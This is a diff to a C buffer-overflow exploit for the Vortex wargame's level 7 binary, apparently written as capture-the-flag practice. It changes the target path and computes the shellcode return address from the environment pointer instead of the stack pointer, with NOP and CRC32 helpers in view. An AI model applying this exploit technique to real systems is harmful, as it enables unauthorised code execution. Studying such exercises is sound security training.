@@ -20,7 +20,7 @@
 #include "../shellcode/shellcode.h"
 #include "../utils/get_esp.h"
 
-#define	VULN_BIN	"./vortex7"
+#define	VULN_BIN	"/vortex/vortex7"
 
 #define	DYNAMIC_CRC32_TABLE
 
@@ -39,6 +39,8 @@
 #define NOP		0x90
 
 typedef unsigned int uint32;
+
+extern char** environ;
 
 /**
  * Creates the CRC table with 256 32-bit entries. CAUTION: Assumes that
@@ -137,7 +139,8 @@ uint32* init_crc_table() {
  */
 char* make_buffer (int offset, int align) {
 	char* buffer = malloc(BUFFER_SIZE);
-	uint32 addr = get_esp() - offset;
+//	uint32 addr = get_esp() - offset;
+	uint32 addr = (uint32)(environ[0] - offset);
 	printf("Using address: 0x%X\n", addr);
 	uint32* addr_ptr = (uint32*)buffer;
 	int i;
